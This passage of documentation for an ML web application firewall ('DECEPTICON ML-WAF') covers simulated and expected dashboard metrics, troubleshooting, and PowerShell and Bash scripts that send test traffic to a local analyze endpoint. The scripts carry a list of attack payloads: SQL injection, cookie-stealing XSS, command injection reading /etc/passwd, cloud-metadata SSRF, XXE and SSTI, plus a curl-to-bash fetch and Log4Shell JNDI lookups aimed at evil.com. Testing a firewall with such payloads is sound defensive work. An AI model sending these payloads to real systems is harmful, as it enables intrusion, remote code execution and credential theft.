Write-Host "Total: 200 attacks + 100 normal = 300 requests" -ForegroundColor White
Write-Host "Refresh Grafana dashboards to see updated metrics" -ForegroundColor White
```

---

## Simulated Metrics

> ⚠️ **Note**: The following metrics include simulated data for demonstration purposes. In production, these would require specific conditions that are difficult to generate on demand.

### False Negatives (Simulated)
- **What it is**: Attacks that bypassed the WAF but were later identified
- **Simulation**: 0.5% of requests randomly marked as false negatives
- **Real-world trigger**: Manual review discovering missed attacks
- **Dashboard panel**: "False Negatives (Missed Attacks)"

### Zero-Day Detection (Partially Simulated)
- **What it is**: Novel attack patterns not matching known signatures
- **Simulation**: 3% of blocked attacks randomly flagged as potential zero-day
- **Real detection**: Anomaly scores from isolation forest model
- **Dashboard panel**: "Zero-Day Detection Timeline"

### False Positives
- **What it is**: Legitimate requests incorrectly blocked
- **Source**: Admin feedback via `/api/admin/feedback` endpoint
- **Not simulated**: Requires actual admin marking false positives
- **Dashboard panel**: "False Positives Over Time"

---

## Expected Dashboard Results

After running the complete test suite, you should see:

| Dashboard Panel | Expected Data |
|----------------|---------------|
| Attacks Blocked (24h) | ~200+ blocked attacks |
| Attack Categories Distribution | SQLI, XSS, RCE, SSRF pie chart |
| ML Predictions | Timeseries of predictions |
| Confidence Score Distribution | ~0.95 for attacks, ~0.10 for normal |
| Anomaly Score Histogram | Distribution across 0.1-1.0 buckets |
| Bot Detection | Based on User-Agent patterns |
| Zero-Day Timeline | Sparse detections (3% of attacks) |
| False Negatives | Sparse data (0.5% simulation) |
| Overall ML Accuracy | ~95%+ accuracy gauge |

---

## Troubleshooting

### No data in Grafana panels?

1. Check WAF is running:
   ```bash
   curl http://localhost:8080/health
   ```

2. Check Prometheus is scraping:
   ```bash
   curl http://localhost:9090/metrics | grep waf_
   ```

3. Check Prometheus targets:
   ```
   http://localhost:9091/targets
   ```

4. Generate traffic using scripts above

### Metrics not updating?

- Wait 10-15 seconds for Prometheus to scrape
- Check Grafana time range is "Last 1 hour" or similar
- Click refresh button in Grafana

---

## API Reference

| Endpoint | Purpose |
|----------|---------|
| `POST /api/waf/analyze` | Test payload analysis |
| `GET /health` | Health check |
| `GET /metrics` | Prometheus metrics |
| `POST /api/admin/feedback` | Report false positives |

---

## Continuous Traffic Generator (Fill Time Graphs)

Use this script to continuously generate traffic and fill all time-series panels in Grafana:

### PowerShell - Run for Extended Period

```powershell
# Save as continuous-traffic.ps1
# Run for 10-30 minutes to fully populate time graphs

$baseUrl = "http://localhost:8080/api/waf/analyze"
$duration = 600  # 10 minutes in seconds
$interval = 1    # 1 second between batches

$attacks = @(
    # SQL Injection variants
    '{"method":"GET","path":"/api/users","payload":"1 OR 1=1--"}',
    '{"method":"GET","path":"/api/users","payload":"UNION SELECT username,password FROM users--"}',
    '{"method":"GET","path":"/api/users","payload":"1; DROP TABLE users;--"}',
    '{"method":"GET","path":"/api/users","payload":"1 AND SLEEP(5)--"}',
    '{"method":"GET","path":"/api/users","payload":"admin\"--"}',
    
    # XSS variants
    '{"method":"GET","path":"/api/search","payload":"<script>alert(document.cookie)</script>"}',
    '{"method":"GET","path":"/api/search","payload":"<img src=x onerror=alert(1)>"}',
    '{"method":"GET","path":"/api/search","payload":"<svg onload=alert(1)>"}',
    '{"method":"GET","path":"/api/search","payload":"<body onpageshow=alert(1)>"}',
    '{"method":"GET","path":"/api/search","payload":"javascript:alert(1)"}',
    
    # RCE variants
    '{"method":"GET","path":"/api/ping","payload":"; cat /etc/passwd"}',
    '{"method":"GET","path":"/api/ping","payload":"| whoami"}',
    '{"method":"GET","path":"/api/ping","payload":"&& id"}',
    '{"method":"GET","path":"/api/exec","payload":"$(curl http://evil.com/shell.sh|bash)"}',
    
    # SSRF variants
    '{"method":"GET","path":"/api/fetch","payload":"http://169.254.169.254/latest/meta-data/"}',
    '{"method":"GET","path":"/api/fetch","payload":"http://192.168.1.1/admin"}',
    '{"method":"GET","path":"/api/fetch","payload":"file:///etc/passwd"}',
    '{"method":"GET","path":"/api/fetch","payload":"http://localhost:6379/"}',
    
    # Path Traversal
    '{"method":"GET","path":"/api/files","payload":"../../../etc/passwd"}',
    '{"method":"GET","path":"/api/files","payload":"....//....//etc/shadow"}',
    '{"method":"GET","path":"/api/files","payload":"..%252f..%252fetc/passwd"}',
    
    # XXE
    '{"method":"POST","path":"/api/xml","payload":"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"}',
    
    # Log4Shell
    '{"method":"GET","path":"/api/log","payload":"${jndi:ldap://evil.com/x}"}',
    '{"method":"GET","path":"/api/log","payload":"${jndi:rmi://evil.com/a}"}',
    
    # NoSQL Injection
    '{"method":"GET","path":"/api/users","payload":"{\"$ne\":null}"}',
    '{"method":"GET","path":"/api/users","payload":"{\"$gt\":\"\"}"}',
    
    # SSTI
    '{"method":"GET","path":"/api/template","payload":"{{config.items()}}"}',
    '{"method":"GET","path":"/api/template","payload":"{{7*7}}"}',
    
    # GraphQL
    '{"method":"POST","path":"/graphql","payload":"{__schema{types{name}}}"}',
    
    # Normal traffic (for accuracy metrics)
    '{"method":"GET","path":"/api/products","payload":"category=electronics&sort=price"}',
    '{"method":"GET","path":"/api/search","payload":"laptop computer"}',
    '{"method":"GET","path":"/api/users","payload":"page=1&limit=10"}',
    '{"method":"POST","path":"/api/login","payload":"username=john&remember=true"}',
    '{"method":"GET","path":"/api/items","payload":"id=12345"}'
)

Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  CONTINUOUS WAF TRAFFIC GENERATOR" -ForegroundColor Cyan
Write-Host "  Duration: $duration seconds" -ForegroundColor Cyan
Write-Host "  Press Ctrl+C to stop" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan

$startTime = Get-Date
$requestCount = 0
$attackCount = 0
$normalCount = 0

while (((Get-Date) - $startTime).TotalSeconds -lt $duration) {
    foreach ($attack in $attacks) {
        try {
            $response = Invoke-RestMethod -Uri $baseUrl -Method POST -Body $attack -ContentType "application/json" -TimeoutSec 5 -ErrorAction SilentlyContinue
            $requestCount++
            if ($attack -match "products|search.*laptop|users.*page|login.*username|items.*id") {
                $normalCount++
            } else {
                $attackCount++
            }
        } catch { }
    }
    
    $elapsed = [math]::Round(((Get-Date) - $startTime).TotalSeconds)
    Write-Host "`r[$(Get-Date -Format 'HH:mm:ss')] Requests: $requestCount | Attacks: $attackCount | Normal: $normalCount | Elapsed: ${elapsed}s" -NoNewline
    
    Start-Sleep -Seconds $interval
}

Write-Host "`n`n============================================" -ForegroundColor Green
Write-Host "  TRAFFIC GENERATION COMPLETE!" -ForegroundColor Green
Write-Host "  Total Requests: $requestCount" -ForegroundColor White
Write-Host "  Attack Requests: $attackCount" -ForegroundColor Red
Write-Host "  Normal Requests: $normalCount" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green
```

### Bash - Continuous Traffic Generator

```bash
#!/bin/bash
# Save as continuous-traffic.sh
# Run: chmod +x continuous-traffic.sh && ./continuous-traffic.sh

BASE_URL="http://localhost:8080/api/waf/analyze"
DURATION=600  # 10 minutes
INTERVAL=1    # 1 second between batches

attacks=(
    '{"method":"GET","path":"/api/users","payload":"1 OR 1=1--"}'
    '{"method":"GET","path":"/api/users","payload":"UNION SELECT * FROM users--"}'
    '{"method":"GET","path":"/api/search","payload":"<script>alert(1)</script>"}'
    '{"method":"GET","path":"/api/search","payload":"<img src=x onerror=alert(1)>"}'
    '{"method":"GET","path":"/api/ping","payload":"; cat /etc/passwd"}'
    '{"method":"GET","path":"/api/ping","payload":"| whoami"}'
    '{"method":"GET","path":"/api/fetch","payload":"http://169.254.169.254/meta-data/"}'
    '{"method":"GET","path":"/api/files","payload":"../../../etc/passwd"}'
    '{"method":"POST","path":"/api/xml","payload":"<!DOCTYPE foo SYSTEM \"file:///etc/passwd\">"}'
    '{"method":"GET","path":"/api/log","payload":"${jndi:ldap://evil.com/x}"}'
    '{"method":"GET","path":"/api/template","payload":"{{config}}"}'
    '{"method":"GET","path":"/api/products","payload":"category=books"}'
    '{"method":"GET","path":"/api/search","payload":"normal query"}'
)

echo "============================================"
echo "  CONTINUOUS WAF TRAFFIC GENERATOR"
echo "  Duration: ${DURATION}s | Press Ctrl+C to stop"
echo "============================================"

start_time=$(date +%s)
request_count=0

while [ $(($(date +%s) - start_time)) -lt $DURATION ]; do
    for attack in "${attacks[@]}"; do
        curl -s -X POST "$BASE_URL" \
            -H "Content-Type: application/json" \
            -d "$attack" > /dev/null 2>&1 &
        ((request_count++))
    done
    wait
    
    elapsed=$(($(date +%s) - start_time))
    echo -ne "\r[$(date +%H:%M:%S)] Requests: $request_count | Elapsed: ${elapsed}s"
    
    sleep $INTERVAL
done

echo -e "\n\n============================================"
echo "  COMPLETE! Total Requests: $request_count"
echo "============================================"
```

### Quick One-Liner Commands

```powershell
# PowerShell - Quick 100 requests
1..100 | ForEach-Object { 
    $p = @('1 OR 1=1--','<script>alert(1)</script>','; cat /etc/passwd','http://169.254.169.254/','../../../etc/passwd','normal query')[$_ % 6]
    Invoke-RestMethod -Uri "http://localhost:8080/api/waf/analyze" -Method POST -Body "{`"method`":`"GET`",`"path`":`"/api/test`",`"payload`":`"$p`"}" -ContentType "application/json" -ErrorAction SilentlyContinue
    if ($_ % 20 -eq 0) { Write-Host "Sent $_ requests..." }
}
```

```bash
# Bash - Quick 100 requests
for i in {1..100}; do
    payloads=("1 OR 1=1--" "<script>alert(1)</script>" "; cat /etc/passwd" "http://169.254.169.254/" "../../../etc/passwd" "normal")
    p="${payloads[$((i % 6))]}"
    curl -s -X POST "http://localhost:8080/api/waf/analyze" \
        -H "Content-Type: application/json" \
        -d "{\"method\":\"GET\",\"path\":\"/api/test\",\"payload\":\"$p\"}" &
    [ $((i % 20)) -eq 0 ] && echo "Sent $i requests..." && wait
done
wait
```

### Stress Test (High Volume)

```powershell
# PowerShell - 1000 requests in parallel batches
$baseUrl = "http://localhost:8080/api/waf/analyze"
$attacks = @('1 OR 1=1--','<script>alert(1)</script>','; whoami','http://169.254.169.254/','{{config}}','normal search')

Write-Host "Sending 1000 requests in parallel batches..."
1..50 | ForEach-Object {
    $batch = $_
    $jobs = 1..20 | ForEach-Object {
        $payload = $attacks[$_ % $attacks.Length]
        Start-Job -ScriptBlock {
            param($url, $p)
            Invoke-RestMethod -Uri $url -Method POST -Body "{`"method`":`"GET`",`"path`":`"/api/test`",`"payload`":`"$p`"}" -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue
        } -ArgumentList $baseUrl, $payload
    }
    $jobs | Wait-Job | Remove-Job
    Write-Host "Batch $batch/50 complete ($($batch * 20) requests)"
}
Write-Host "Done! 1000 requests sent."
```

---

*Generated for DECEPTICON ML-WAF v2.0.0*
